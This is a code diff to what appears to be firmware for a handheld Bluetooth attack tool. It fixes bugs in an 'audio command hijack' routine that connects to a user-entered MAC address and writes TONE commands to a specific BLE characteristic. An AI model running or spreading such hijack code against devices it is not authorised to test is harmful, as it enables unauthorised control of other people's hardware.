@@ -42,7 +42,6 @@ void AudioCommandService::begin() {
     
     NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
     pAdvertising->addServiceUUID(pService->getUUID());
-    pAdvertising->setScanResponse(true);
     pAdvertising->start();
     
     isRunning = true;
@@ -100,9 +99,14 @@ bool attemptAudioCommandHijack(NimBLEAddress target) {
     
     displayMessage("Audio service found", "Sending tones...", "", "", 0);
     
-    uint8_t tones[] = {440, 550, 660, 770};
+    uint16_t tones[] = {440, 550, 660, 770};
     for(int i = 0; i < 4; i++) {
-        uint8_t toneCmd[7] = {'T', 'O', 'N', 'E', tones[i] >> 8, tones[i] & 0xFF, 100};
+        uint8_t toneCmd[7] = {
+            'T', 'O', 'N', 'E',
+            (uint8_t)(tones[i] >> 8),
+            (uint8_t)(tones[i] & 0xFF),
+            100
+        };
         
         NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID("19B10001-E8F2-537E-4F6C-D104768A1214"));
         if(pChar) {
@@ -124,7 +128,7 @@ void audioCommandHijackTest() {
     String input = keyboard("", 17, "Target MAC (AA:BB:CC:DD:EE:FF)");
     if(input.isEmpty()) return;
     
-    NimBLEAddress target(input.c_str());
+    NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);
     
     if(!requireButtonHoldConfirmation("Start audio CMD hijack?", 3000)) {
         return;
